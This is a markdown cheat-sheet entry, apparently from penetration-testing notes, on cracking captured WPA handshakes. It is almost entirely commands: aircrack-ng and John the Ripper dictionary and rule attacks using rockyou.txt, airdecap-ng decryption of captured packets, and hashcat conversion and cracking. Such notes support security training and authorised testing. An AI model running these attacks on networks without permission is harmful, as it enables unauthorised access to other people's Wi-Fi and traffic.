---
title: Wireless Password Cracking
category: wireless
subcategory: sub-05
os: linux
command: aircrack-ng -w /usr/share/wordlists/rockyou.txt -e networkname -b BS:ID:BS:ID:BS:ID wpa-01.cap
tools: aircrack-ng
---

## Password Cracking

I've described the detailed password cracking process [in this article](https://oval-lentil-4f0.notion.site/Jak-ama-has-a-2e526fd69b8e80d8baefdc076f2ec869)) (click!). However, here we'll focus on cracking passwords in the context of WiFi.

### aircrack-ng

Let's start with aircrack-ng and check the password cracking speed on our computer:

```bash
aircrack-ng -S
```

Standard WPA attack:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -e networkname -b BS:ID:BS:ID:BS:ID wpa-01.cap
```

### airdecap-ng

Checks offline if a password is correct. If the password is correct, it creates a new file (e.g., wpa-01-dec.cap) with decrypted packets, which you can then analyze in Wireshark. 

```bash
airdecap-ng -b BS:ID:BS:ID:BS:ID -e networkname -p crackedpassword wpa-1.cap
```


### Output:


- **Success** → will show the number of decrypted packets and create the `dec.cap` file
- **Failure (wrong password)** → 0 decrypted packets in the appropriate table, e.g., WPA


### Dictionaries

You can find dictionaries here:

```
/usr/share/wordlists
/usr/share
```

If they aren't there, I recommend:

- https://aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists
- https://www.kali.org/tools/seclists/

### John the Ripper

Let's do it now with John the Ripper. First, edit the rules:

```bash
sudo mousepad /etc/john/john.conf
```

Generate a list according to the modified rules and submit it for cracking:

```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --rules -stdout | aircrack-ng -e wifu -w - ~/wpa-02.cap
```

### Hashcat

After capturing the handshake in .cap format (e.g., via airodump-ng, bettercap, or wifite), you can use Hashcat to crack the password. Hashcat uses the GPU, which significantly speeds up the attack compared to aircrack-ng.

### Basic Commands

```bash
hashcat -b
hashcat --help
hashcat -b -m 2500
```

### Converting a .cap file to .hccapx

Hashcat doesn't read .cap files directly. You must first convert the file to the .hccapx format:

```bash
/usr/lib/hashcat-utils/cap2hccapx.bin wpa-01.cap output.hccapx
```

The `cap2hccapx.bin` utility is included in the hashcat-utils package.

### Password Cracking

```bash
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt
```

After cracking the password, Hashcat will display:

```
BSSID:client_MAC:network_name:password
```

For example:

```
aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:MyNetwork:password123
```

### Showing Cracked Passwords

```bash
hashcat -m 2500 output.hccapx --show
```

### Using a Specific GPU

```bash
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt -d 1
```

### Rules Attack

Modifies words from the dictionary:

```bash
hashcat -m 2500 output.hccapx /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```